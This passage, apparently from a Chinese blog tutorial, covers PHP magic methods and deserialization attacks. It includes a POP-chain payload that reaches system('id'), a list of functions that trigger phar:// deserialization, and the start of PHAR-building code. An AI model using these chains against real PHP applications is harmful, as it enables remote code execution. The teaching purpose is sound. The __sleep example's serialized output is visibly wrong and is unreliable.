反序列化结束后也会触发一次 __destruct() 魔术方法</span><br><span class="hljs-comment">// 因为反序列化得到的是对象，用完之后会被销毁</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202159217.png" srcset="/img/loading.gif" lazyload alt="image-20260319202159217"></p>
+<p>第一次触发：实例化对象结束后，这个对象最终会被销毁，就会触发一次__destruct()魔术方法</p>
+<p>第二次触发：反序列化结束后，反序列化得到的是对象，用完之后会被销毁，触发__destruct()魔术方法</p>
+<h3 id="回收方法"><a href="#回收方法" class="headerlink" title="回收方法"></a><strong>回收方法</strong></h3><ul>
+<li>手动回收：就是用unset方法来释放对象</li>
+<li>自动回收：对象没有值引用指向，或者脚本结束完全释放</li>
+</ul>
+<h2 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h2><p>序列化serialize()函数会检查类中是否存在一个魔术方法__sleep()</p>
+<p>如果存在，该方法会被先调用，然后才执行序列化操作</p>
+<p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组</p>
+<p>如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误</p>
+<ul>
+<li>功能： 清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组</li>
+<li>参数：成员属性</li>
+<li>返回值：需要被序列化存储的成员属性</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SITE</span> = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;nickname&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>先实例化<code>User</code>，会首先触发<code>__construct()</code>魔术方法，会给<code>$username, $nickname, $password</code>分别赋值<code>&#39;a&#39;, &#39;b&#39;, &#39;c&#39;</code></li>
+<li>然后在序列化<code>serialize()</code>对象时就会触发<code>__sleep()</code>，返回只含有<code>username</code>和<code>nickname</code>的数组</li>
+</ul>
+<p>如果没有sleep()魔术方法，序列化结果为</p>
+<p>O:4:”User”:3:{s:8:”username”;s:1:”a”;s:8:”nickname”;s:1:”b”;s:14:”Userpassword”;s:1:”c”;}</p>
+<p>这题有sleep()，序列化结果为</p>
+<p>O:4:”User”:2:{s:8:”username”;s:1:”a”;s:8:”nickname”;s:1:”a”;s:14:”nickname”;s:1:”b”;}</p>
+<p>只有username和nickname</p>
+<p>不懂为什么改了数量还改了后面附的值</p>
+<h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h2><ul>
+<li>调用对象的方法：print_r或var_dump</li>
+<li>调用字符串的方法：echo或print</li>
+<li>触发时机：把对象当作字符串调用时（使用echo或者print时）</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span> = <span class="hljs-string">&quot;this is test!!&quot;</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">         </span>&#123;<br>             <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;格式不对，输出不了!&#x27;</span>;<br>          &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$test</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>$test &#x3D; new User() ;</p>
+<p>是将User类实例化为一个对象test，然后用print_r和echo调用这个对象</p>
+<p>从结果输出可以看到，能用print_r调用对象，但不能用echo，</p>
+<p>使用echo会导致将对象以字符串的形式调用，从而触发<code>__toString</code>魔术方法  </p>
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202210877.png" srcset="/img/loading.gif" lazyload alt="image-20260319202210877"></p>
+<h2 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h2><ul>
+<li>触发时机：把对象当作函数调用</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span> = <span class="hljs-string">&quot;this is test!!&quot;</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">         </span>&#123;<br>             <span class="hljs-keyword">echo</span>  <span class="hljs-string">&#x27;它不是个函数!&#x27;</span>;<br>          &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span> -&gt;benben;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span>() -&gt;benben;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>echo $test -&gt;benben;</p>
+<p>这是正常调用对象中属性，输出对应的值</p>
+<p>echo $test() -&gt;benben;</p>
+<p>这是以调用函数的方式调用test这个对象，此时会触发__invoke()魔术方法</p>
+<h2 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h2><ul>
+<li>触发时机：调用一个不存在的方法</li>
+<li>参数：2个参数传参$arg1(对应不存在的方法名)，$arg2(对应给不存在的方法传入的参数)</li>
+<li>返回值： 调用的不存在的方法的名称和参数</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$arg1</span>,<span class="hljs-subst">$arg2</span>[0]&quot;</span>;<br>          &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$test</span> -&gt; <span class="hljs-title function_ invoke__">callxxx</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>$test -&gt; callxxx(‘a’);</p>
+<p>callxxx是一个不存在的方法，并传入参数a会触发魔术方法__call()</p>
+<p>$arg1对应不存在的方法名callxxx()</p>
+<p>$arg2对应传入的参数a</p>
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202216429.png" srcset="/img/loading.gif" lazyload alt="image-20260319202216429"></p>
+<h2 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h2><ul>
+<li>触发时机： 静态调用或调用成员常量时使用的方法不存在  </li>
+<li>参数：2个参数传参$arg1(对应不存在的方法名)，$arg2(对应给不存在的方法传入的参数)</li>
+<li>返回值：调用的不存在的方法的名称和参数</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$arg1</span>,<span class="hljs-subst">$arg2</span>[0]&quot;</span>;<br>          &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span>::<span class="hljs-title function_ invoke__">callxxx</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>$test::callxxx(‘a’);</p>
+<p>这是静态调用的方式调用test对象中的callxxx()（一个不存在的方法），因此触发了__callStatic()魔术方法</p>
+<p>$arg1对应callxxx（不存在的方法名）</p>
+<p>$arg2对应a（给不存在的方法传入的参数）</p>
+<h2 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h2><ul>
+<li>触发时机：调用的成员属性不存在</li>
+<li>参数：传参$arg1（不存在的成员属性）</li>
+<li>返回值：不存在的成员属性名称</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span> -&gt;var2;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>$test -&gt;var2;</p>
+<p>调用test对象中的var2这个成员属性，但是在对象中这个成员属性不存在</p>
+<p>触发__get()魔术方法，传入的参数$arg1是不存在的成员属性var2</p>
+<h2 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h2><ul>
+<li>触发时机：给不存在的成员属性赋值</li>
+<li>参数：传参$arg1(对应不存在的方法名)，$arg2(对应给不存在的方法传入的参数)</li>
+<li>返回值：不存在的成员属性的名称和赋的值</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span> ,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>.<span class="hljs-string">&#x27;,&#x27;</span>.<span class="hljs-variable">$arg2</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span> -&gt;var2=<span class="hljs-number">1</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>$test -&gt;var2&#x3D;1;</p>
+<p>将test对象中的var2属性赋值为1，但var2不存在</p>
+<p>触发__set()魔术方法</p>
+<p>$arg1对应var2（不存在的属性）</p>
+<p>$arg2对应1（给不存在属性赋的值）</p>
+<h2 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h2><ul>
+<li>触发时机：对不可访问或不存在的属性，使用isset()或empty()时会触发</li>
+<li>参数：传参$arg1（对应不可访问或不存在的属性）</li>
+<li>返回值：不可访问或不存在的成员属性的名称</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span> </span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$test</span>-&gt;<span class="hljs-keyword">var</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">empty</span>(<span class="hljs-variable">$test</span>-&gt;var1);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>private $var;——&gt;私有属性</p>
+<p>isset($test-&gt;var)</p>
+<p>isset函数调用了不可访问的私有属性var触发了__isset()魔术方法</p>
+<p>empty($test-&gt;var1);</p>
+<p>empty函数调用了不存在的属性var1，触发了__isset()魔术方法</p>
+<h2 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h2><ul>
+<li>触发时机：对不可访问（私有属性）或不存在的属性使用unset()时会触发</li>
+<li>参数：传参$arg1（对应不可访问或不存在的属性）</li>
+<li>返回值：不存在的成员属性名</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span> </span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$test</span>-&gt;<span class="hljs-keyword">var</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$test</span>-&gt;var2);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>private $var;——&gt;私有属性</p>
+<p>unset($test-&gt;var);</p>
+<p>unset函数调用对象test中的私有属性var，触发__unset()魔术方法，传入的参数是不可访问的私有属性var</p>
+<p>unset($test-&gt;var2)</p>
+<p>unset函数调用不存在的属性var2，触发__unset()魔术方法，传入的参数是不存在的属性var2</p>
+<h2 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h2><ul>
+<li>触发时机：使用clone关键词拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"> </span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-string">&quot;__clone test&quot;</span>;<br>          &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">clone</span>(<span class="hljs-variable">$test</span>)<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>$test &#x3D; new User();</p>
+<p>将User类实例化成对象test，这个类中有__clone魔术方法</p>
+<p>$newclass &#x3D; clone($test)</p>
+<p>使用clone函数将对象test拷贝给新对象newclass，新对象就会触发拷贝过来的__clone魔术方法</p>
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202223653.png" srcset="/img/loading.gif" lazyload alt="image-20260319202223653"></p>
+<h1 id="POP链构造与利用"><a href="#POP链构造与利用" class="headerlink" title="POP链构造与利用"></a>POP链构造与利用</h1><h2 id="什么是POP链"><a href="#什么是POP链" class="headerlink" title="什么是POP链"></a>什么是POP链</h2><p>POP 链（Property-Oriented Programming Chain，面向属性编程链）是反序列化漏洞利用的核心技术。其核心思想是通过控制对象的属性值，引导程序执行流经过多个类的方法调用，最终触发危险操作（如代码执行、文件读写等）。</p>
+<h2 id="POP链构建的关键"><a href="#POP链构建的关键" class="headerlink" title="POP链构建的关键"></a>POP链构建的关键</h2><ol>
+<li>寻找可利用的魔术方法为起点</li>
+<li>构建方法调用链，连接起点和终点</li>
+<li>找到危险函数或操作作为终点</li>
+</ol>
+<h2 id="构造恶意POP链"><a href="#构造恶意POP链" class="headerlink" title="构造恶意POP链"></a>构造恶意POP链</h2><p>存在protected、private属性需要对输出进行URL编码</p>
+<h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><ol>
+<li>先复制源码</li>
+<li>删掉源码中的魔术方法语句只留下类和属性</li>
+<li>找到可利用的魔术方法</li>
+<li>构造链</li>
+</ol>
+<h3 id="构造对象链"><a href="#构造对象链" class="headerlink" title="构造对象链"></a>构造对象链</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$rce</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">RCE</span>();<br><span class="hljs-variable">$rce</span>-&gt;cmd = <span class="hljs-string">&quot;id&quot;</span>; <span class="hljs-comment">// 要执行的命令</span><br><br><span class="hljs-variable">$exploit</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>();<br><span class="hljs-variable">$exploit</span>-&gt;rce = <span class="hljs-variable">$rce</span>;<br><br><span class="hljs-variable">$logger</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Logger</span>();<br><span class="hljs-variable">$logger</span>-&gt;handler = <span class="hljs-variable">$exploit</span>;<br><br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$logger</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>;<br></code></pre></td></tr></table></figure>
+
+<p>生成序列化字符串</p>
+<p>O:6:”Logger”:1:{s:7:”handler”;O:7:”Exploit”:1:{s:3:”rce”;O:3:”RCE”:1:{s:3:”cmd”;s:2:”id”;}}}</p>
+<p>当服务器对该字符串进行反序列化时，会创建Logger对象，其handler属性指向Exploit对象，而Exploit对象的rce属性指向RCE对象。当脚本结束时，Logger的__destruct方法被调用，触发方法以下链</p>
+<p>Logger::__destruct() -&gt; Exploit::log() -&gt; RCE::execute() -&gt; system(“id”)</p>
+<p> 最终执行系统命令 “id”，返回当前用户信息  </p>
+<h2 id="基于PHAR文件的POP链利用"><a href="#基于PHAR文件的POP链利用" class="headerlink" title="基于PHAR文件的POP链利用"></a>基于PHAR文件的POP链利用</h2><h3 id="1-PHAR文件"><a href="#1-PHAR文件" class="headerlink" title="1)PHAR文件"></a>1)PHAR文件</h3><p> PHAR（PHP ARchive）是 PHP 中类似于 JAR 的一种打包文件格式，它可以存储用户自定义的元数据，并且这些元数据是以序列化形式存储的。这一特性使得 PHAR 文件成为反序列化攻击的重要载体。  </p>
+<h3 id="2-PHAR文件结构"><a href="#2-PHAR文件结构" class="headerlink" title="2)PHAR文件结构"></a>2)PHAR文件结构</h3><ul>
+<li>Stub：文件头，PHAR文件的入口点， 当 PHP 解释器加载 PHAR 文件时，会首先执行 Stub 代码，格式为xxx<?php xxx __HALT_COMPILER();?></li>
+<li>Manifest：包含文件权限、属性以及序列化形式存储的用户自定义元数据</li>
+<li>Contents：实际的文件内容</li>
+<li>Signature：验证文件完整性和真实性，签名放在文件末尾</li>
+</ul>
+<p>phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化</p>
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202231855.png" srcset="/img/loading.gif" lazyload alt="image-20260319202231855"></p>
+<p>支持 PHAR 协议的函数包括  </p>
+<ul>
+<li>fileatime, filectime, file_exists, file_get_contents  </li>
+<li>file_put_contents, file, filegroup, fopen  </li>
+<li>fileinode, filemtime, fileowner, fileperms</li>
+<li>is_dir, is_executable, is_file, is_link</li>
+<li>is_readable, is_writable, is_writeable, parse_ini_file  </li>
+<li>copy, unlink, stat, readfile</li>
+</ul>
+<h3 id="3-PHAR文件构造示例"><a href="#3-PHAR文件构造示例" class="headerlink" title="3)PHAR文件构造示例"></a>3)PHAR文件构造示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 删除之前的test.par文件(如果有)</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># 创建一个phar对象，文件名必须以 .phar 为后缀</span><br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># 开始写文件</span><br><span class="hljs-comment"># 调用startBuffering()这个函数意味着后续的写入操作不会立即将数据写入文件，而是先存储在缓冲区中，直到调用stopBuffering()方法</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span 